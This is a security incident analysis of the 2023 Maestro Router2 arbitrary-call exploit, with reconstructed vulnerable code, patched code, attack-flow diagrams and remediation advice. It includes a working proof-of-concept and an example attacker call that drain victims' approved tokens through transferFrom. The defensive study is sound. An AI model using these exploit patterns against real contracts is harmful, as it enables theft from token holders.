# Maestro Router2 — Arbitrary Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-10-24 |
| **Protocol** | Maestro (Telegram Trading Bot) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~280 ETH (approx. $485,000 ~ $668,000) · 106 addresses affected |
| **Attacker** | [0xce63...48c6](https://etherscan.io/address/0xce6397e53c13ff2903ffe8735e478d31e648a2c6) |
| **Attack Contract** | [0xe6c6...9ab](https://etherscan.io/address/0xe6c6e86e04de96c4e3a29ad480c94e7a471969ab) |
| **Attack Tx** | [0xc087...90d92](https://etherscan.io/tx/0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92) (14 ETH) and others |
| **Vulnerable Contract** | [0x80a6...d5d9e](https://etherscan.io/address/0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e) (MaestroRouter2) |
| **Logic Contract** | [0x8EAE...ff7a](https://etherscan.io/address/0x8EAE9827b45bcC6570c4e82b9E4FE76692b2ff7a) (MaestroRouter2 Logic) |
| **Root Cause** | Missing access control on function `0x9239127f` in the proxy pattern's logic contract — arbitrary token addresses and calldata could be passed to unauthorized steal tokens from users who had granted approvals |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/MaestroRouter2_exp.sol) |

---

## 1. Vulnerability Overview

Maestro is a Telegram-based cryptocurrency trading bot that automatically executes token swaps through the `MaestroRouter2` smart contract when users send commands via Telegram. To use the bot, users must `approve()` their tokens to the Router contract — this prerequisite became the foundation of the attack.

`MaestroRouter2` is implemented using a proxy pattern, where the proxy routes all calls via `delegatecall` in its `fallback()` to the logic contract (`0x8EAE...ff7a`). The function corresponding to selector `0x9239127f` in the logic contract performs an external call, forwarding arbitrary calldata to an arbitrary token contract. This function had **no caller validation and no parameter validation whatsoever.**

The attacker exploited this function to drain tokens from victims who had `approve()`d the Router, using `transferFrom(victim, attacker, amount)` calldata. A single external function call was sufficient to drain the entire balance of every affected victim.

**Key Vulnerability Summary**:
- ❌ No caller validation on function `0x9239127f` — anyone can make external calls on behalf of the Router
- ❌ No allowlist validation on the token address (`varg0`) or calldata (`v3.data`) being passed
- ❌ No logic to block dangerous function selectors (e.g., `transferFrom`) embedded in calldata
- ❌ All users who had granted unlimited `approve()` to the Router were exposed
- ✅ Fix: Restrict function callers + whitelist allowed tokens/selectors + validate calldata

---

## 2. Vulnerable Code Analysis

### 2.1 MaestroRouter2 Proxy — delegatecall Forwarding Structure

```solidity
// ❌ Vulnerable code — MaestroRouter2 proxy contract (0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e)

contract MaestroRouter2 {
    address public logicContract; // Logic contract address (mutable)

    // fallback: delegates all calls to the logic contract
    fallback() external payable {
        address impl = logicContract;
        assembly {
            calldatacopy(0, 0, calldatasize())
            // ❌ Executes logic via delegatecall — preserves Router's context (msg.sender, storage)
            // ❌ This means external calls in the logic contract use the Router's approve allowances
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}
```

**Issue**: Due to `delegatecall`, the logic contract executes within the Router's context. This means `IERC20(token).transferFrom(victim, attacker, amount)` called from the logic runs with the Router as the `spender`, allowing it to drain the full balance of any victim who had `approve()`d the Router.

---

### 2.2 Vulnerable Function in Logic Contract (Selector `0x9239127f`) — Core Vulnerability

```solidity
// ❌ Vulnerable code — MaestroRouter2 Logic contract (0x8EAE9827b45bcC6570c4e82b9E4FE76692b2ff7a)
// Source unverified — reconstructed from bytecode and transaction analysis

contract MaestroRouter2Logic {

    // Selector: 0x9239127f
    // Parameters: (address token, bytes calldata data, uint8 flag, bool someFlag)
    function arbitraryCall(
        address token,     // ❌ Arbitrary token/contract address — no validation
        bytes calldata data, // ❌ Calldata to forward to external contract — no validation
        uint8 flag,
        bool someFlag
    ) external {
        // ❌ No validation of msg.sender (caller) — anyone can call
        // ❌ No check that token address is in an allowed token list
        // ❌ No blocking of dangerous function selectors in data (e.g., transferFrom)

        // Executes within Router's context, so all of the Router's approve allowances are available
        (bool success, ) = token.call(data);
        require(success, "Call failed");
    }
}
```

**Example attacker call**:
```solidity
bytes memory transferFromData = abi.encodeWithSignature(
    "transferFrom(address,address,uint256)",
    victim,      // Victim address (user who approved the Router)
    attacker,    // Attacker address
    balance      // Victim's full balance
);

// Call Router with function selector 0x9239127f
bytes memory exploitData = abi.encodeWithSelector(
    bytes4(0x9239127f),
    address(MogToken),   // token: Mog token contract
    transferFromData,    // data: transferFrom calldata
    uint8(0),
    false
);
(bool success,) = address(MaestroRouter2).call(exploitData);
```

---

### 2.3 Patched Code — Access Control and Calldata Validation Added

```solidity
// ✅ Patched code — access control + calldata validation added

contract MaestroRouter2Logic {

    // ✅ Whitelist of allowed external router addresses (DEX routers only)
    mapping(address => bool) public allowedTargets;

    // ✅ Blocked function selector list (direct token transfers prohibited: transferFrom, transfer, etc.)
    mapping(bytes4 => bool) public blockedSelectors;

    // ✅ Block transferFrom, transfer, approve, etc. during initialization
    constructor() {
        blockedSelectors[bytes4(keccak256("transferFrom(address,address,uint256)"))] = true;
        blockedSelectors[bytes4(keccak256("transfer(address,uint256)"))] = true;
        blockedSelectors[bytes4(keccak256("approve(address,uint256)"))] = true;
    }

    // Selector: 0x9239127f (patched version)
    function arbitraryCall(
        address target,
        bytes calldata data,
        uint8 flag,
        bool someFlag
    ) external {
        // ✅ Verify caller is an authorized Maestro backend
        require(isAuthorizedCaller(msg.sender), "Unauthorized caller");

        // ✅ Verify target address is a whitelisted DEX router
        require(allowedTargets[target], "Target not whitelisted");

        // ✅ Verify the first 4 bytes of data (function selector) are not blocked
        if (data.length >= 4) {
            bytes4 selector = bytes4(data[:4]);
            require(!blockedSelectors[selector], "Selector blocked");
        }

        (bool success, ) = target.call(data);
        require(success, "Call failed");
    }

    function isAuthorizedCaller(address caller) internal view returns (bool) {
        // ✅ Only allow authorized Maestro backend addresses
        return authorizedCallers[caller];
    }
}
```

---

## 3. Attack Flow

### 3.1 Setup Phase

- Many users had pre-`approve()`d various tokens to `MaestroRouter2` in order to use the Maestro bot
- Some users had granted unlimited approvals (`type(uint256).max`)
- The attacker had pre-collected victim addresses with large approvals set on the Router

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────┐
│  Attacker (0xce6397e53c13ff2903ffe8735e478d31e648a2c6)  │
└───────────────────────┬─────────────────────────────────┘
                        │
                        │ 1. Query allowance/balance per victim
                        ▼
┌─────────────────────────────────────────────────────────┐
│  Mog Token (0xaaeE1A9723aaDb7afA2810263653A34bA2C21C7a) │
│  .allowance(victim, MaestroRouter2)                     │
│  .balanceOf(victim)                                     │
└───────────────────────┬─────────────────────────────────┘
                        │
                        │ 2. Call vulnerable function
                        │    selector: 0x9239127f
                        │    params: (Mog, transferFromData, 0, false)
                        ▼
┌─────────────────────────────────────────────────────────┐
│  MaestroRouter2 Proxy (0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e) │
│  fallback() → delegatecall(logicContract, calldata)     │
└───────────────────────┬─────────────────────────────────┘
                        │
                        │ 3. Execute arbitrary external call from logic contract
                        │    (Router context preserved)
                        ▼
┌─────────────────────────────────────────────────────────┐
│  MaestroRouter2 Logic (0x8EAE9827b45bcC6570c4e82b9E4FE76692b2ff7a)  │
│  arbitraryCall(token=Mog, data=transferFrom(...))        │
│  → Mog.call(transferFromData)                           │
└───────────────────────┬─────────────────────────────────┘
                        │
                        │ 4. Transfer victim tokens using Router's approve allowance
                        ▼
┌─────────────────────────────────────────────────────────┐
│  Mog Token                                              │
│  transferFrom(victim → attacker, balance)               │
│  (repeated for 7 victims; 106 addresses total affected) │
└───────────────────────┬─────────────────────────────────┘
                        │
                        │ 5. Swap stolen Mog for WETH
                        ▼
┌─────────────────────────────────────────────────────────┐
│  Uniswap V2 Router (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)    │
│  swapExactTokensForTokensSupportingFeeOnTransferTokens  │
│  Mog → WETH                                             │
└───────────────────────┬─────────────────────────────────┘
                        │
                        │ 6. Profit realized
                        ▼
┌─────────────────────────────────────────────────────────┐
│  Attacker balance: ~14 ETH (first Tx)                   │
│  Total across all Txs: ~280 ETH (multiple Txs, tokens)  │
└─────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Attack Duration**: ~30 minutes (trading halted after detection)
- **Total Damage**: 280 ETH (106 addresses, multiple token types)
- **Number of Attack Txs**: 12+ (distributed across token types)
- **Maestro Response**: After detecting the attack, Maestro directly refunded 610 ETH to 106 victim addresses (compensating beyond the actual losses)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo -- Total Lost : ~280 ETH
// Attacker : 0xce6397e53c13ff2903ffe8735e478d31e648a2c6
// Attack Contract : 0xe6c6e86e04de96c4e3a29ad480c94e7a471969ab
// Attacker Transaction : 0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92

contract MaestroRouter2Exploit is Test {
    IMaestroRouter router = IMaestroRouter(0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e);
    IERC20 Mog = IERC20(0xaaeE1A9723aaDb7afA2810263653A34bA2C21C7a);
    WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V2 UniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function testExploit() public {
        cheats.rollFork(18_423_219); // Fork at attack block

        // [Step 1] Build victim list (addresses that approved Mog to the Router)
        address[] memory victims = new address[](7);
        victims[0] = 0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F;
        // ... (7 victims total)

        // [Step 2] Vulnerable function selector (not published in ABI)
        bytes4 vulnFunctionSignature = hex"9239127f";

        // [Step 3] Execute arbitrary transferFrom for each victim
        for (uint256 i = 0; i < victims.length; i++) {
            // Determine drain amount as the lesser of victim's allowance and balance
            uint256 allowance = Mog.allowance(victims[i], address(router));
            uint256 balance = Mog.balanceOf(victims[i]);
            balance = allowance < balance ? allowance : balance;

            // Build transferFrom(victim → attacker, balance) calldata
            bytes memory transferFromData = abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                victims[i],      // from: victim
                address(this),   // to: attacker contract
                balance          // amount: maximum drainable amount
            );

            // Pass token address + transferFrom calldata to vulnerable function
            // → Router transfers victim's Mog to attacker
            bytes memory data = abi.encodeWithSelector(
                vulnFunctionSignature,
                Mog,             // target token contract
                transferFromData, // calldata to execute
                uint8(0),
                false
            );
            (bool success,) = address(router).call(data);
        }

        // [Step 4] Swap stolen Mog for WETH (realize profit)
        uint256 MogBalance = Mog.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = address(Mog);
        path[1] = address(WETH);
        Mog.approve(address(UniRouter), MogBalance);
        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MogBalance, 0, path, address(this), block.timestamp
        );
        // Result: ~14 ETH profit (first Tx)
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Arbitrary External Call | CRITICAL | CWE-20 |
| V-02 | Missing Access Control | CRITICAL | CWE-284 |
| V-03 | Unvalidated Input | HIGH | CWE-20 |
| V-04 | Delegatecall Context Abuse | HIGH | CWE-610 |

### V-01: Arbitrary External Call

- **Description**: The `0x9239127f` function in the logic contract accepts an arbitrary contract address and calldata as arguments and executes an external call without any validation. This allowed the attacker to invoke `transferFrom` on the Mog token within the Router's context, stealing victim tokens.
- **Impact**: Full balance of any token could be drained from all users who had `approve()`d the Router. At time of attack: 106 addresses, ~280 ETH in damages.
- **Attack Condition**: Victim must have previously `approve()`d the Router. Attacker only needs victim addresses and balance information — no flash loan required.

### V-02: Missing Access Control

- **Description**: The `0x9239127f` function is callable from any address. There is no `onlyOwner`, `onlyAuthorized`, or equivalent access control to restrict calls to Maestro's backend server.
- **Impact**: External attackers can perform arbitrary operations on behalf of the Router.
- **Attack Condition**: Function selector (`0x9239127f`) must be identifiable (discoverable via Etherscan transaction analysis).

### V-03: Unvalidated Input

- **Description**: The `token` address and `data` calldata passed to the function undergo no validation. There is no allowlist of permitted token addresses, and no logic to filter dangerous function selectors (e.g., `transferFrom`) embedded in the calldata.
- **Impact**: Attacker can invoke dangerous functions such as `transferFrom` and `approve` against arbitrary tokens.
- **Attack Condition**: Same as V-01.

### V-04: Delegatecall Context Abuse

- **Description**: The `delegatecall` pattern causes the logic contract to execute within the proxy's context (storage, `msg.sender`, etc.). As a result, `transferFrom` calls issued from the logic contract operate with the proxy (Router) as the `spender`, consuming the victim's `allowance`.
- **Impact**: A vulnerability in the logic contract affects the Router's entire set of approve allowances.
- **Attack Condition**: Any user who has `approve()`d the Router.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Restrict function callers — allow only Maestro backend
modifier onlyAuthorizedBackend() {
    require(
        authorizedCallers[msg.sender],
        "MaestroRouter: Unauthorized caller"
    );
    _;
}

// ✅ Fix 2: Allowed target whitelist (DEX routers only)
mapping(address => bool) public allowedTargets;

// ✅ Fix 3: Block dangerous function selectors
mapping(bytes4 => bool) public blockedSelectors;

function arbitraryCall(
    address target,
    bytes calldata data,
    uint8 flag,
    bool someFlag
) external onlyAuthorizedBackend {
    // ✅ Verify target is a whitelisted DEX router
    require(allowedTargets[target], "Target not in whitelist");

    // ✅ Verify the function selector in calldata is not on the danger list
    if (data.length >= 4) {
        bytes4 sel = bytes4(data[:4]);
        require(!blockedSelectors[sel], "Dangerous selector blocked");
    }

    (bool success, ) = target.call(data);
    require(success, "External call failed");
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Arbitrary External Call | Maintain a whitelist of allowed DEX router addresses · Always validate before `target.call()` |
| V-02: Missing Access Control | Apply `onlyAuthorizedBackend` modifier · Manage privileges via Multisig |
| V-03: Unvalidated Input | Check first 4 bytes of calldata · Block `transferFrom`/`transfer`/`approve` selectors |
| V-04: Delegatecall Context Abuse | Mandatory security audit on every logic contract upgrade · Document scope of delegatecall usage |
| General: Unlimited Approvals | Guide users via UX to approve only the minimum required amount · Consider using EIP-2612 permit |

---

## 7. Lessons Learned

1. **Danger of the Arbitrary External Call Pattern**: Any function that calls an external contract in the form `token.call(data)` must validate both the call target and the calldata. This pattern is especially dangerous in contracts like Routers that hold `approve()` from many users. Similar incidents have repeatedly occurred: Dexible (2023-02), SushiSwap RouteProcessor (2023-04), Socket Gateway (2024-01), Seneca (2024-02).

2. **The delegatecall + approve Combination**: In a proxy pattern, the logic contract executes within the proxy's context. A vulnerability in the logic is therefore a vulnerability against every permission the proxy holds (all approved tokens in full). Security audits for logic contracts in proxy patterns must be held to a higher standard.

3. **Structural Risk of Telegram Bots / Aggregator Routers**: Services where users grant large `approve()` allowances to a contract for convenience have an extremely wide attack surface. A single vulnerable function can drain all approved tokens in bulk. Such services must not be deployed without a security audit.

4. **Risk of Unverified Function Selectors**: Even functions whose ABI is not publicly disclosed can be reverse-engineered by extracting selectors from transaction calldata on Etherscan. Every externally exposed function — including `0x9239127f` — is in scope for a security audit.

5. **Avoid Unlimited Approval Habits**: Users should avoid granting `type(uint256).max` approvals to convenience services like trading bots. Approve only what is needed, or immediately revoke after use (`approve(router, 0)`). Service providers should consider using EIP-2612 `permit()` to reduce the need for pre-approvals.

6. **Importance of Rapid Incident Response**: Maestro halted trading within 30 minutes of detecting the attack and refunded 610 ETH to victims within two days. This demonstrates the value of pre-built monitoring systems and emergency response procedures (contract pause mechanisms). Upgradeable proxies must include an emergency `pause` function.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Figures

| Item | PoC Value | On-Chain Actual | Notes |
|------|--------|-------------|------|
| First Tx damage | Sum of 7 victim Mog balances | ~14 ETH | First Tx only |
| Total stolen | Sum across multiple tokens | ~280 ETH | 12+ Txs |
| Victims affected | 7 (PoC example) | 106 addresses | Actual damage was broader |
| Attacker refund | N/A | 610 ETH | Refunded to victims by Maestro |

### 8.2 Key Attack Transaction List

| Tx Hash (abbreviated) | ETH Damage | Notes |
|---------------|---------|------|
| [0xc087...90d92](https://etherscan.io/tx/0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92) | ~14 ETH | Mog token (PoC example) |
| [0xede8...9756](https://etherscan.io/tx/0xede874f9a4333a26e97d3be9d1951e6a3c2a8861e4e301787093cfb1293d4756) | ~28.5 ETH | — |
| [0xe60c...9da6](https://etherscan.io/tx/0xe60c5a3154094828065049121e244dfd362606c2a5390d40715ba54699ba9da6) | ~75 ETH | Largest single-Tx loss |
| [0xffb4...eb1](https://etherscan.io/tx/0xffb4bd29825bdd41adf344028f759692021cbadc2d4cb5b587e68fd8285c5eb1) | ~41 ETH | — |
| [Other Txs] | ~121.5 ETH | Remaining 8 Txs combined |

### 8.3 Pre-Attack Conditions

- Victims had pre-`approve()`d various tokens to `MaestroRouter2(0x80a6...)` in order to use the Maestro bot
- Some victims had granted unlimited approvals (`type(uint256).max`)
- Attacker pre-collected victim addresses and allowance data (via Etherscan event log analysis)
- No flash loan required — attack executable with zero upfront capital

### 8.4 Analysis References

- CertiK Analysis: [Maestro & Unibot](https://www.certik.com/resources/blog/1Zh5XbaDstXKteFcRSmOcp-maestro-and-unibot)
- Phalcon Analysis: [Twitter](https://twitter.com/Phalcon_xyz/status/1717014871836098663)
- Beosin Analysis: [Twitter](https://twitter.com/BeosinAlert/status/1717013965203804457)
- The Block Coverage: [Article](https://www.theblock.co/amp/post/259338/maestro-telegram-bot-suffers-a-contract-exploit-500000-of-eth-stolen)